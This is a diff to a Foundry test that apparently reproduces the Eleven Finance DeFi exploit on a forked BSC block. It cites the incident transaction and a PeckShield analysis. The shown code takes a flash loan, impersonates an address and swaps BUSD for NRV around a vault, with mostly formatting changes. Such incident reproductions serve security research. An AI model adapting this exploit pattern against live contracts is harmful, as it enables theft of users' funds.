@@ -8,7 +8,7 @@ import "forge-std/Test.sol";
 import {IPancakeRouter} from "src/interfaces/IPancakeRouter.sol";
 import {IPancakePair} from "src/interfaces/IPancakePair.sol";
 import {IWBNB} from "src/interfaces/IWBNB.sol";
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 /*
 Eleven Finance Exploit POC
 
@@ -17,18 +17,17 @@ tx hash: 0x6450d8f4db09972853e948bee44f2cb54b9df786dace774106cd28820e906789
 https://peckshield.medium.com/eleven-finance-incident-root-cause-analysis-123b5675fa76*/
 
 interface IElevenNeverSellVault {
-
     function depositAll() external;
     function emergencyBurn() external;
     function withdrawAll() external;
-
 }
 
 contract Eleven is Test {
+    IPancakeRouter router =
+        IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
 
-    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
-
-    IPancakePair cake_LP = IPancakePair(0x401479091d0F7b8AE437Ee8B054575cd33ea72Bd);
+    IPancakePair cake_LP =
+        IPancakePair(0x401479091d0F7b8AE437Ee8B054575cd33ea72Bd);
 
     IERC20 nrv = IERC20(0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096);
 
@@ -38,13 +37,20 @@ contract Eleven is Test {
 
     address public ape_lp = 0x51e6D27FA57373d8d4C256231241053a70Cb1d93;
 
-    IElevenNeverSellVault vault = IElevenNeverSellVault(0x27DD6E51BF715cFc0e2fe96Af26fC9DED89e4BE8);
+    IElevenNeverSellVault vault =
+        IElevenNeverSellVault(0x27DD6E51BF715cFc0e2fe96Af26fC9DED89e4BE8);
 
     //Path from BUSD --> NRV
-    address[] path_1 = [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, 0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096];
+    address[] path_1 = [
+        0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56,
+        0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096
+    ];
 
     //Path from NRV --> BUSD
-    address[] path_2 = [0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56];
+    address[] path_2 = [
+        0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096,
+        0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56
+    ];
 
     function setUp() public {
         // fork bsc block number 8530973
@@ -64,15 +70,28 @@ contract Eleven is Test {
     function testExploit() public {
         console.log("-------Start exploit-------");
 
-        console.log("attacker BUSD balance before is", busd.balanceOf(address(this)));
+        console.log(
+            "attacker BUSD balance before is",
+            busd.balanceOf(address(this))
+        );
 
         vm.startPrank(0xc71e2F581b77De945C8A7A191b0B238c81f11eD6);
 
         //Take a flashloan from apeswap
-        IPancakePair(ape_lp).swap(0, 953_869_628_210_538_003_222_368, address(this), "Gimme da loot");
+        IPancakePair(ape_lp).swap(
+            0,
+            953_869_628_210_538_003_222_368,
+            address(this),
+            "Gimme da loot"
+        );
     }
 
-    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+    function pancakeCall(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) external {
         sender;
         amount0;
         amount1;
@@ -81,7 +100,10 @@ contract Eleven is Test {
     }
 
     function attack() public {
-        console.log("received BUSD flashloan for", busd.balanceOf(address(this)) / 1 ether);
+        console.log(
+            "received BUSD flashloan for",
+            busd.balanceOf(address(this)) / 1 ether
+        );
 
         //Swap BUSD for NRV
         router.swapExactTokensForTokens(
@@ -138,7 +160,9 @@ contract Eleven is Test {
 
         console.log("-------Finish exploit-------");
 
-        console.log("attacker BUSD balance after is", busd.balanceOf(address(this)) / 1 ether);
+        console.log(
+            "attacker BUSD balance after is",
+            busd.balanceOf(address(this)) / 1 ether
+        );
     }
-
 }
